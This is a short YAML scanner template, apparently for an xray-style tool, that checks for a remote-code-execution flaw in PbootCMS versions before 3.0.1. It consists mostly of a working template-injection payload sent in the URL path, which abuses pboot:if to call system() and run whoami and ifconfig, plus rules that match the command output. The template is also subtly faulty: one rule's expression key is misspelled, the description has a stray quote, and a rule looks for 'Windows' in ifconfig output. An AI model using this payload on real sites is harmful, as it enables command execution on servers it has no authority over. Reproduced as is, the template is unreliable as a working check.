id: pbootcms-rce

info:
  name: Pboot CMS RCE
  author: 执着
  severity: critical
  description: |
    PbootCMS前台RCE，执行任意系统命令
    影响版本3.0.1以前"

set:
  reverse: newReverse()
  reverseURL: reverse.url
  referer: request.url
  host: request.url.host
rules:
  r0:
    request:
      method: GET
      path: /#}{pboot:if(true)(@sys.@tem)(@whoami);//)}test{/pboot:if}
      headers:
        Referer: '{{referer}}'
        Domain: '{{host}}'
        Reverse: '{{reverseURL}}'
        Content-Length: 100
        Host: 127.0.0.1
    expression: response.status == 200 && response.body.bcontains(b'flags=')
  r1:
    request:
      method: GET
      path: /#}{pboot:if(true)(@sys.@tem)(@ifconfig);//)}test{/pboot:if}
    expresssion: response.status == 200 && response.body.bcontains(b'Windows')
expression: r0() || r1()